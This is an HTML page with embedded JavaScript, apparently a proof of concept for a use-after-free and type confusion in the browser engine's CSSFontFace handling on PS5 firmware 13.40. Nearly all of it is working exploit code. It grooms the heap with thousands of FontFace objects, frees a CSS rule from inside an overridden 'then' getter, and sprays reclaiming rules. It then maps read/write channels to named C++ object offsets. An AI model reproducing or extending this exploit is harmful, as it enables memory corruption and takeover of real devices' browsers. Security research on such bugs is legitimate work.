<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>CSSFontFace Confusion – PS5 FW 13.40 PoC</title>

<!-- 
  Preloaded stylesheet:
  - "prepad" and "x" are used for heap grooming and the target UAF.
  - The CSS rule for "x" (index 1) will be deleted to free the C++ CSSFontFace.
-->
<style id="s">
@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
</style>
</head>
<body>
<div id="out" style="font-family:monospace;white-space:pre-wrap;padding:10px;color:#0f0;background:#000;"></div>

<script>
"use strict";
var O = document.getElementById("out");
function P(m, c) {
  var s = document.createElement("span");
  if (c) s.style.color = c;
  s.textContent = m + "\n";
  O.appendChild(s);
  O.scrollTop = O.scrollHeight;
}
function Ok(m) { P("  ✅ " + m, "#0f0"); }
function Fl(m) { P("  ✘ " + m, "#f00"); }
function St(m) { P("  ★ " + m + " ★", "#ff0"); }

// ---- Font binary helper (dummy WOFF) ----
var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
var FBb = (function() {
  var s = atob(FB), b = new Uint8Array(s.length);
  for (var i = 0; i < s.length; i++) b[i] = s.charCodeAt(i);
  return b;
})();
function mkBuf() { var c = new Uint8Array(FBb.length); c.set(FBb); return c.buffer; }
function fs() { try { void document.body.offsetTop; } catch(e) {} }

var sh = document.getElementById("s").sheet;
var keep = [], holes = [], trigger = null, uafOk = false;

// ---- Phase 1: Heap grooming & UAF trigger ----
for (var i = 0; i < 4096; i++) {
  try {
    var f = new FontFace("h_" + i, mkBuf(), {
      unicodeRange: "U+E1" + (i % 16).toString(16),
      style: i % 2 === 0 ? "normal" : "italic",
      weight: String(100 + (i % 9) * 100)
    });
    document.fonts.add(f);
    holes.push(f);
  } catch(e) {}
}
fs();
for (var i = 1; i < holes.length; i += 2) try { document.fonts.delete(holes[i]); } catch(e) {}
fs();

trigger = new FontFace("trigger", "local(Helvetica)", { unicodeRange: "U+0041" });
document.fonts.add(trigger); void trigger.loaded;

// padding rules
for (var i = 0; i < 48; i++) try {
  sh.insertRule("@font-face{font-family:pad" + i + ";src:url(np" + i + ".woff);unicode-range:U+E000}", sh.cssRules.length);
} catch(e) {}
fs();

var fst = document.createElement("style"); document.head.appendChild(fst);
var fsh = fst.sheet;
for (var i = 0; i < 768; i++) try {
  fsh.insertRule("@font-face{font-family:fl" + i + ";src:url(nf" + i + ".woff);unicode-range:U+E000}", fsh.cssRules.length);
} catch(e) {}
fs();

// The UAF trigger: override FontFace.prototype.then
Object.defineProperty(FontFace.prototype, "then", {
  configurable: true,
  get: function() {
    if (this === trigger && !uafOk) {
      uafOk = true;
      try {
        var ck = new FontFace("ck", "local(Helvetica)", { unicodeRange: "U+E124" });
        document.fonts.add(ck); keep.push(ck);
        sh.deleteRule(1); // FREE the CSSFontFace for "x"
        fs();
        while (fsh.cssRules.length) try { fsh.deleteRule(0); } catch(e) {}
        fs();
        for (var i = 0; i < holes.length; i += 4) try { document.fonts.delete(holes[i]); } catch(e) {}
        fs();
      } catch(e) {}
      // Memory pressure
      for (var i = 0; i < 4; i++) { var t = []; for (var j = 0; j < 128; j++) t.push(new ArrayBuffer(8192)); }
      // Spray 2048 CSSFontFace objects via insertRule
      for (var i = 0; i < 2048; i++) {
        try {
          sh.insertRule("@font-face{font-family:A_" + i + ";src:local(Courier);font-weight:" +
            (100 + (i % 9) * 100) + ";font-style:" + (i % 2 === 0 ? "normal" : "italic") +
            ";unicode-range:U+0042}", sh.cssRules.length);
        } catch(e) {}
      }
      fs();
      // Force font load
      try {
        var d = document.createElement("div");
        d.textContent = "AB";
        d.style.cssText = "position:absolute;left:-9999px;font:64px trigger;";
        document.body.appendChild(d);
        void d.offsetWidth;
      } catch(e) {}
    }
    return undefined;
  }
});

// ---- Phase 2: Load mixed fonts, detect confusion ----
document.fonts.load("1em trigger, x", "AB").then(function(faces) {
  var aFamily = null, aFace = null;
  for (var i = 0; i < faces.length; i++) {
    if (faces[i].family && faces[i].family.indexOf("A_") === 0) {
      aFamily = faces[i].family;
      aFace = faces[i];
    }
  }
  if (!aFamily) {
    Fl("No reclaimed FontFace found – UAF failed.");
    return;
  }
  St("CONFUSION ACTIVE: " + aFamily);
  keep.push(faces);

  // Find the CSS rule that corresponds to this FontFace
  var aIndex = -1;
  for (var i = 0; i < sh.cssRules.length; i++) {
    try {
      var r = sh.cssRules[i];
      if (r.type === 5 && r.style.getPropertyValue("font-family").indexOf(aFamily) !== -1) {
        aIndex = i; break;
      }
    } catch(e) {}
  }
  if (aIndex === -1) {
    Fl("Cannot locate matching CSSRule.");
    return;
  }
  var aRule = sh.cssRules[aIndex], aStyle = aRule.style;

  // Quick liveness test
  aStyle.setProperty("font-weight", "700"); fs();
  if (String(aFace.weight) !== "700") {
    Fl("Confusion died after first write.");
    return;
  }
  Ok("Confusion ALIVE – writing 700 to font-weight, read back: " + aFace.weight);

  // ---- R/W channel mapping with visible proof ----
  function probe(cssName, writeVal, faceProp, expectedOff, desc, type) {
    aStyle.setProperty(cssName, writeVal); fs();
    var readVal = aFace[faceProp];
    var readStr = String(readVal), writeStr = String(writeVal);
    var passed = false;
    if (type === "numeric") {
      var rn = parseFloat(readStr), wn = parseFloat(writeVal);
      if (!isNaN(rn) && !isNaN(wn) && rn === wn) passed = true;
      if (readStr.indexOf(writeStr) !== -1) passed = true;
    } else if (type === "float") {
      var fv = parseFloat(readStr), wv = parseFloat(writeVal);
      if (!isNaN(fv) && !isNaN(wv) && Math.abs(fv - wv) < 0.01) passed = true;
    } else {
      if (readStr.indexOf(writeStr) !== -1) passed = true;
    }
    if (passed) Ok(desc + " (" + expectedOff + ") -> " + readStr);
    else Fl(desc + " (" + expectedOff + ") -> " + readStr);
    try { aStyle.removeProperty(cssName); } catch(e) {}
    fs();
  }

  // 17 channels, 7 fields
  probe("font-weight", "100", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-weight", "200", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-weight", "300", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-weight", "400", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-weight", "500", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-weight", "600", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-weight", "700", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-weight", "800", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-weight", "900", "weight", "0x88", "m_fontSelectionCapabilities.weight", "numeric");
  probe("font-family", "testFamProbe", "family", "0x20", "m_family", "string");
  probe("unicode-range", "U+0000-007F", "unicodeRange", "0x28", "m_ranges", "string");
  probe("font-feature-settings", "\"test\" 1", "featureSettings", "0x40", "m_featureSettings", "string");
  probe("font-display", "block", "display", "0x58", "m_loadingBehavior", "enum");
  probe("font-display", "swap", "display", "0x58", "m_loadingBehavior", "enum");
  probe("font-display", "fallback", "display", "0x58", "m_loadingBehavior", "enum");
  probe("font-display", "optional", "display", "0x58", "m_loadingBehavior", "enum");
  probe("font-stretch", "condensed", "stretch", "0x88+4", "m_fontSelectionCapabilities.width", "string");
  probe("font-stretch", "expanded", "stretch", "0x88+4", "m_fontSelectionCapabilities.width", "string");
  probe("font-style", "italic", "style", "0x88+8", "m_fontSelectionCapabilities.slope", "string");

  St("MAPPING COMPLETE");
});
</script>
